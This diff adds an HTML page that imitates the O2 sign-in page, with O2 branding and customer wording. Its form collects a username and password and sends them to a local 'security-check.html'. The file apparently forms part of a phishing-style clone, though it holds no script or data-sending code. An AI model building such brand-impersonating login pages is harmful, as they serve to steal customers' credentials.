@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>O2 Login</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <div class="nav">
+            <div class="nav-left">
+                <img src="o2-logo.png" alt="O2 Logo" class="logo">
+                <a href="#">Personal</a>
+                <a href="#">Business</a>
+            </div>
+            <div class="nav-right">
+                <a href="#">Sign in or Register</a>
+            </div>
+        </div>
+    </header>
+
+    <section class="login-section form-container">
+        <div class="login-container">
+            <h1>Sign in</h1>
+            <form class="login-form" action="security-check.html">
+                <label for="username">Username (usually your email address)</label>
+                <input type="text" id="username" name="username" required>
+
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required>
+
+                <div class="checkbox">
+                    <input type="checkbox" id="remember">
+                    <label for="remember">Remember my username</label>
+                </div>
+
+                <button type="submit">Sign in</button>
+            </form>
+
+            <div class="register-info">
+                <h2>Already an O2 customer?</h2>
+                <p>If you've got a Pay Monthly account, then we've automatically registered you with My O2 and given you a username and password.</p>
+                <a href="#">Help me sign in</a>
+            </div>
+
+            <div class="register-info">
+                <h2>Not yet registered?</h2>
+                <p>If you're a Pay As You Go customer, here are just some of the benefits of registering:</p>
+                <ul>
+                    <li>Check your usage and remaining balance</li>
+                    <li>Set up auto top-ups</li>
+                    <li>Manage O2 Rewards</li>
+                </ul>
+            </div>
+        </div>
+    </section>
+</body>
+</html>
